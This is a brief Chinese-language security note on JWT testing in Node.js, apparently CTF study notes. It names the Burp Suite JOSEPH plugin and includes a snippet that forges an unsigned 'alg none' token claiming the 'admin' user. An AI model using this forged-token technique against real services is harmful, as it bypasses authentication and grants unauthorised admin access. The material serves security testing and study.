nodejs中的jwt库在签名时用algorithm指定算法，而在验签时用algorithms指定算法
在测试jwt相关的安全问题时可以使用burpsuite的JOSEPH插件辅助测试

```ts
// https://www.secpulse.com/archives/129304.html
// https://blog.csdn.net/miuzzx/article/details/127744431#t1
const jwt = require('jsonwebtoken');

var payload = {
    secretid: [],
    username: 'admin',
}
var token = jwt.sign(payload, undefined, {algorithm: 'none'});
console.log(token);
```
